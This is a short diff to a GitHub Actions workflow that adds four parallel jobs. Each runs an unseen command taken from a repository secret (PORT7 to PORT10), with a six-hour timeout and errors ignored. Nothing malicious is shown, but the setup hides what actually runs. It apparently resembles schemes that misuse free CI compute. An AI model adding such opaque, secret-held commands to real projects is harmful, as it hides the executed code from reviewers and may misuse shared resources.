@@ -62,3 +62,35 @@ jobs:
       - name: running
         continue-on-error: true
         run: ${{ secrets.PORT6 }}
+  run7:
+    needs: [run]
+    runs-on: ubuntu-24.04
+    timeout-minutes: 360
+    steps: 
+      - name: running
+        continue-on-error: true
+        run: ${{ secrets.PORT7 }}
+  run8:
+    needs: [run]
+    runs-on: ubuntu-24.04
+    timeout-minutes: 360
+    steps: 
+      - name: running
+        continue-on-error: true
+        run: ${{ secrets.PORT8 }}
+  run9:
+    needs: [run]
+    runs-on: ubuntu-24.04
+    timeout-minutes: 360
+    steps: 
+      - name: running
+        continue-on-error: true
+        run: ${{ secrets.PORT9 }}
+  run10:
+    needs: [run]
+    runs-on: ubuntu-24.04
+    timeout-minutes: 360
+    steps: 
+      - name: running
+        continue-on-error: true
+        run: ${{ secrets.PORT10 }}
